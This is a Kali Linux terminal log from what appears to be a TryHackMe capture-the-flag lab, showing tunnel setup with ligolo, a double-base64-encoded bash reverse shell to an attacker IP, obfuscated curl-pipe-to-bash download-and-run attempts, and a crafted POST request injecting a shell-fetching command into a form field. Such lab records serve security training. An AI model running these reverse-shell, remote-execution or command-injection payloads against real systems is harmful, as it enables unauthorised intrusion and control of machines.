+-rw-r--r--  1 kali kali    33385 Aug  5 15:12 nse_nmaplib.cc
+-rw-r--r--  1 kali kali      336 Aug  5 15:12 nse_nmaplib.h
+-rw-rw-r--  1 kali kali  1028296 Oct  6 01:15 nse_nmaplib.o
+-rw-r--r--  1 kali kali    36061 Aug  5 15:12 nse_nsock.cc
+-rw-r--r--  1 kali kali      126 Aug  5 15:12 nse_nsock.h
+-rw-rw-r--  1 kali kali   437856 Oct  6 01:15 nse_nsock.o
+-rw-r--r--  1 kali kali    21437 Aug  5 15:12 nse_openssl.cc
+-rw-r--r--  1 kali kali      238 Aug  5 15:12 nse_openssl.h
+-rw-r--r--  1 kali kali    21641 Aug  5 15:12 nse_ssl_cert.cc
+-rw-r--r--  1 kali kali     3551 Aug  5 15:12 nse_ssl_cert.h
+-rw-r--r--  1 kali kali     6414 Aug  5 15:12 nse_utility.cc
+-rw-r--r--  1 kali kali     6181 Aug  5 15:12 nse_utility.h
+-rw-rw-r--  1 kali kali   308256 Oct  6 01:15 nse_utility.o
+-rw-r--r--  1 kali kali    28511 Aug  5 15:12 nse_zlib.cc
+-rw-r--r--  1 kali kali      108 Aug  5 15:12 nse_zlib.h
+-rw-rw-r--  1 kali kali    87336 Oct  6 01:15 nse_zlib.o
+drwxrwxr-x  5 kali kali     4096 Aug  5 15:12 nsock
+-rw-r--r--  1 kali kali   110373 Aug  5 15:12 osscan2.cc
+-rw-r--r--  1 kali kali    21307 Aug  5 15:12 osscan2.h
+-rw-rw-r--  1 kali kali  1401880 Oct  6 01:15 osscan2.o
+-rw-r--r--  1 kali kali    40704 Aug  5 15:12 osscan.cc
+-rw-r--r--  1 kali kali    12997 Aug  5 15:12 osscan.h
+-rw-rw-r--  1 kali kali  1531608 Oct  6 01:15 osscan.o
+-rw-r--r--  1 kali kali    92251 Aug  5 15:12 output.cc
+-rw-r--r--  1 kali kali    10683 Aug  5 15:12 output.h
+-rw-rw-r--  1 kali kali  1781760 Oct  6 01:15 output.o
+-rw-r--r--  1 kali kali     7384 Aug  5 15:12 payload.cc
+-rw-r--r--  1 kali kali     3848 Aug  5 15:12 payload.h
+-rw-rw-r--  1 kali kali   498552 Oct  6 01:15 payload.o
+-rw-r--r--  1 kali kali    30969 Aug  5 15:12 portlist.cc
+-rw-r--r--  1 kali kali    12886 Aug  5 15:12 portlist.h
+-rw-rw-r--  1 kali kali   534712 Oct  6 01:15 portlist.o
+-rw-r--r--  1 kali kali    15972 Aug  5 15:12 portreasons.cc
+-rw-r--r--  1 kali kali     6957 Aug  5 15:12 portreasons.h
+-rw-rw-r--  1 kali kali   997920 Oct  6 01:15 portreasons.o
+-rw-r--r--  1 kali kali     4631 Aug  5 15:12 probespec.h
+-rw-r--r--  1 kali kali     7334 Aug  5 15:12 protocols.cc
+-rw-r--r--  1 kali kali     4129 Aug  5 15:12 protocols.h
+-rw-rw-r--  1 kali kali   459368 Oct  6 01:15 protocols.o
+-rw-r--r--  1 kali kali     1706 Aug  5 15:12 README.md
+-rw-r--r--  1 kali kali      190 Aug  5 15:12 README-WIN32
+-rw-r--r--  1 kali kali   104250 Aug  5 15:12 scan_engine.cc
+-rw-r--r--  1 kali kali    21953 Aug  5 15:12 scan_engine_connect.cc
+-rw-r--r--  1 kali kali     3796 Aug  5 15:12 scan_engine_connect.h
+-rw-rw-r--  1 kali kali   803504 Oct  6 01:15 scan_engine_connect.o
+-rw-r--r--  1 kali kali    29402 Aug  5 15:12 scan_engine.h
+-rw-rw-r--  1 kali kali  1430520 Oct  6 01:15 scan_engine.o
+-rw-r--r--  1 kali kali    84739 Aug  5 15:12 scan_engine_raw.cc
+-rw-r--r--  1 kali kali     4310 Aug  5 15:12 scan_engine_raw.h
+-rw-rw-r--  1 kali kali  1115064 Oct  6 01:15 scan_engine_raw.o
+-rw-r--r--  1 kali kali    21154 Aug  5 15:12 scan_lists.cc
+-rw-r--r--  1 kali kali     5401 Aug  5 15:12 scan_lists.h
+-rw-rw-r--  1 kali kali   232536 Oct  6 01:15 scan_lists.o
+drwxrwxr-x  2 kali kali    32768 Aug  5 15:12 scripts
+-rw-r--r--  1 kali kali   107574 Aug  5 15:12 service_scan.cc
+-rw-r--r--  1 kali kali    14800 Aug  5 15:12 service_scan.h
+-rw-rw-r--  1 kali kali  1459816 Oct  6 01:15 service_scan.o
+-rw-r--r--  1 kali kali    18352 Aug  5 15:12 services.cc
+-rw-r--r--  1 kali kali     3864 Aug  5 15:12 services.h
+-rw-rw-r--  1 kali kali   563472 Oct  6 01:15 services.o
+-rw-r--r--  1 kali kali    23038 Aug  5 15:12 shtool
+-rw-r--r--  1 kali kali     6090 Aug  5 15:12 string_pool.cc
+-rw-r--r--  1 kali kali     4502 Aug  5 15:12 string_pool.h
+-rw-rw-r--  1 kali kali   163464 Oct  6 01:15 string_pool.o
+-rw-r--r--  1 kali kali     5101 Aug  5 15:12 struct_ip.h
+-rw-r--r--  1 kali kali    18207 Aug  5 15:12 Target.cc
+-rw-r--r--  1 kali kali     7742 Aug  5 15:12 TargetGroup.cc
+-rw-r--r--  1 kali kali     5121 Aug  5 15:12 TargetGroup.h
+-rw-rw-r--  1 kali kali   485280 Oct  6 01:15 TargetGroup.o
+-rw-r--r--  1 kali kali    13498 Aug  5 15:12 Target.h
+-rw-rw-r--  1 kali kali   726456 Oct  6 01:15 Target.o
+-rw-r--r--  1 kali kali    21751 Aug  5 15:12 targets.cc
+-rw-r--r--  1 kali kali     5866 Aug  5 15:12 targets.h
+-rw-rw-r--  1 kali kali  1200688 Oct  6 01:15 targets.o
+-rw-r--r--  1 kali kali    56087 Aug  5 15:12 tcpip.cc
+-rw-r--r--  1 kali kali    18136 Aug  5 15:12 tcpip.h
+-rw-rw-r--  1 kali kali   749960 Oct  6 01:15 tcpip.o
+drwxrwxr-x  2 kali kali     4096 Aug  5 15:12 tests
+-rw-r--r--  1 kali kali    27863 Aug  5 15:12 timing.cc
+-rw-r--r--  1 kali kali    11860 Aug  5 15:12 timing.h
+-rw-rw-r--  1 kali kali   307920 Oct  6 01:15 timing.o
+-rw-r--r--  1 kali kali    51512 Aug  5 15:12 traceroute.cc
+-rw-r--r--  1 kali kali     3544 Aug  5 15:12 traceroute.h
+-rw-rw-r--  1 kali kali  1809352 Oct  6 01:15 traceroute.o
+-rw-r--r--  1 kali kali      524 Aug  5 15:12 .travis.yml
+-rw-r--r--  1 kali kali    18832 Aug  5 15:12 utils.cc
+-rw-r--r--  1 kali kali     5143 Aug  5 15:12 utils.h
+-rw-rw-r--  1 kali kali    62496 Oct  6 01:15 utils.o
+-rw-r--r--  1 kali kali    14280 Aug  5 15:12 xml.cc
+-rw-r--r--  1 kali kali     4250 Aug  5 15:12 xml.h
+-rw-rw-r--  1 kali kali   173312 Oct  6 01:15 xml.o
+drwxrwxr-x  7 kali kali     4096 Aug  5 15:12 zenmap
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/nmap-7.991]
+└─$ cd ..               
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls -al
+total 64
+drwxr-xr-x  6 kali kali  4096 Oct  6 01:11  .
+drwx------ 25 kali kali  4096 Oct  5 11:39  ..
+-rw-rw-r--  1 kali kali  7591 Sep  6 11:11  aes_encrypt.py
+-rw-rw-r--  1 kali kali  6100 May 16 10:20  ap-south-1-everroveractual-premium.ovpn
+-rw-rw-r--  1 kali kali  6096 May  7 09:56 'eu-west-3-everroveractual-regular(1).ovpn'
+-rw-------  1 kali kali  6096 May  7 09:05  eu-west-3-everroveractual-regular.ovpn
+drwxrwxr-x 23 kali kali 12288 Oct  6 01:17  nmap-7.991
+drwxrwxr-x  4 kali kali  4096 Oct  6 01:15  nmap7-r
+drwxrwxr-x 17 kali kali  4096 Oct  5 03:59  snap@05102026
+drwxrwxr-x  7 kali kali  4096 Oct  5 11:42  thmenv
+lrwxrwxrwx  1 kali kali    25 Oct  5 04:00  WORKSPACE -> /run/media/kali/WORKSPACE
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip tuntap add user kali mode tun ligolo
+ioctl(TUNSETIFF): Device or resource busy
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip tuntap add user kali mode tun ligolo
+ioctl(TUNSETIFF): Device or resource busy
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip link delete ligolo
+sudo ip tuntap add user kali mode tun ligolo
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip link delete ligolo
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip tuntap add user kali mode tun ligolo          
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip link set ligolo up 
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali.kali       kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+10.48.151.116 target.thm
+172.18.0.2 backend.thm
+192.168.135.146 me.thm
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip route add 240.0.0.1 dev ligolo
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ip route add 172.18.0.0/24 dev ligolo
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd WORKSPACE               
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ ls    
+jjj.html  nmap-x64.tar.gz  payload_gen.py  pre2.txt  pre.txt  req.txt  res.txt  shell.sh  thm_contrabando
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ nano jjj.html 
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo TDJKcGJpOWlZWE5vSUMxcElENG1JQzlrWlhZdmRHTndMekV3TGpFMExqa3dMakl6TlM4ME5EUTFJREErSmpFPQ= | base64 -d | base64 -d
+/bin/bash -i >& /dev/tcp/10.14.90.235/4445 0>&1                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo 'curl http://192.168.135.146:9000 | base64 | base64 | bash'
+curl http://192.168.135.146:9000 | base64 | base64 | bash
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo 'curl http://192.168.135.146:9000 | base64 | base66'       
+curl http://192.168.135.146:9000 | base64 | base66
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo 'curl http://192.168.135.146:9000' | base64 | base64       
+WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d | bash)
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    285 100    285   0      0 136.6k      0                              0
+<!DOCTYPE: command not found
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d)       
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Directory listing for /</title>
+</head>
+<body>
+<h1>Directory listing for /</h1>
+<hr>
+<ul>
+<li><a href="shell.sh">shell.sh</a></li>
+<li><a href="thm_contrabando/">thm_contrabando/</a></li>
+</ul>
+<hr>
+</body>
+</html>
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d | /bin/bash)
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    285 100    285   0      0 215.7k      0                              0
+<!DOCTYPE: command not found
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d | /bin/bash -c)
+/bin/bash: -c: option requires an argument
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d | /bash -c)    
+zsh: no such file or directory: /bash
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d | bash -c) 
+bash: -c: option requires an argument
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ bash -c  $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d | bash -c) 
+
+bash: -c: option requires an argument
+bash: -c: option requires an argument
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ bash -c  $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d)           
+
+curl: try 'curl --help' or 'curl --manual' for more information
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d)  
+
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Directory listing for /</title>
+</head>
+<body>
+<h1>Directory listing for /</h1>
+<hr>
+<ul>
+<li><a href="shell.sh">shell.sh</a></li>
+<li><a href="thm_contrabando/">thm_contrabando/</a></li>
+</ul>
+<hr>
+</body>
+</html>
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d) 
+
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Directory listing for /</title>
+</head>
+<body>
+<h1>Directory listing for /</h1>
+<hr>
+<ul>
+<li><a href="shell.sh">shell.sh</a></li>
+<li><a href="thm_contrabando/">thm_contrabando/</a></li>
+</ul>
+<hr>
+</body>
+</html>
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo WTNWeWJDQm9kSFJ3T2k4dk1Ua3lMakUyT0M0eE16VXVNVFEyT2prd01EQUsK | base64 -d | base64 -d   
+curl http://192.168.135.146:9000
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ nano pre.txt             
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ nano pre.txt
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ cat pre.txt 
+POST /gen.php HTTP/1.1
+Host: localhost:8080
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+
+length=8;sh -c "$(curl -s 192.168.135.146:9000/shell.sh)"
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali.kali       kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+10.48.151.116 target.thm
+172.18.0.2 backend.thm
+192.168.135.146 me.thm
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz 
+--2026-10-06 01:43:36--  https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
+Resolving github.com (github.com)... 20.207.73.82
+Connecting to github.com (github.com)|20.207.73.82|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://release-assets.githubusercontent.com/github-production-release-asset/362849350/a3fb3c00-a924-11eb-813f-540bdda84e31?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-10-06T08%3A29%3A48Z&rscd=attachment%3B+filename%3Dnmap-x64.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-10-06T07%3A29%3A44Z&ske=2026-10-06T08%3A29%3A48Z&sks=b&skv=2018-11-09&sig=LRJH7OBmmDyscd5aqiAGDmF5YyXbG0oB703XliPUWaE%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc5MTI3NDQxNywibmJmIjoxNzkxMjcyNjE3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.bRnqz5w9NgQiW9z-DD2916fBMJfvF9gBazwRJWo0ApA&response-content-disposition=attachment%3B%20filename%3Dnmap-x64.tar.gz&response-content-type=application%2Foctet-stream [following]
+--2026-10-06 01:43:37--  https://release-assets.githubusercontent.com/github-production-release-asset/362849350/a3fb3c00-a924-11eb-813f-540bdda84e31?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-10-06T08%3A29%3A48Z&rscd=attachment%3B+filename%3Dnmap-x64.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-10-06T07%3A29%3A44Z&ske=2026-10-06T08%3A29%3A48Z&sks=b&skv=2018-11-09&sig=LRJH7OBmmDyscd5aqiAGDmF5YyXbG0oB703XliPUWaE%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc5MTI3NDQxNywibmJmIjoxNzkxMjcyNjE3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.bRnqz5w9NgQiW9z-DD2916fBMJfvF9gBazwRJWo0ApA&response-content-disposition=attachment%3B%20filename%3Dnmap-x64.tar.gz&response-content-type=application%2Foctet-stream
+Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
+Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10686789 (10M) [application/octet-stream]
+Saving to: ‘nmap-x64.tar.gz’
+
+nmap-x64.tar.gz                        100%[===========================================================================>]  10.19M  9.66MB/s    in 1.1s    
+
+2026-10-06 01:43:38 (9.66 MB/s) - ‘nmap-x64.tar.gz’ saved [10686789/10686789]
+
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ ls -al
+total 23136
+drwxr-xr-x  3 kali kali    16384 Dec 31  1969 .
+drwxr-x---+ 3 root root       60 Oct  5 06:10 ..
+-rw-r--r--  1 kali kali 12877122 Aug  5 15:27 nmap-7.991.tar.bz2
+-rw-r--r--  1 kali kali 10686789 Dec  7  2021 nmap-x64.tar.gz
+-rw-r--r--  1 kali kali     1163 Oct  5 23:48 payload_gen.py
+-rw-r--r--  1 kali kali      171 Oct  6 00:03 pre.txt
+-rw-r--r--  1 kali kali      448 Oct  6 00:42 req.txt
+-rw-r--r--  1 kali kali      502 Oct  6 00:43 res.txt
+-rw-r--r--  1 kali kali       56 Oct  5 05:24 shell.sh
+drwxr-xr-x  2 kali kali    16384 Oct  5 04:02 thm_contrabando
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ rm nmap-7.991.tar.bz2     
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ ls                               
+nmap-x64.tar.gz  payload_gen.py  pre2.txt  pre.txt  req.txt  res.txt  shell.sh  thm_contrabando
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 payload_gen.py 
+Traceback (most recent call last):
+  File "/run/media/kali/WORKSPACE/payload_gen.py", line 1, in <module>
+    from pwn import *
+ModuleNotFoundError: No module named 'pwn'
+                                                                                                                                                           
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ 
+
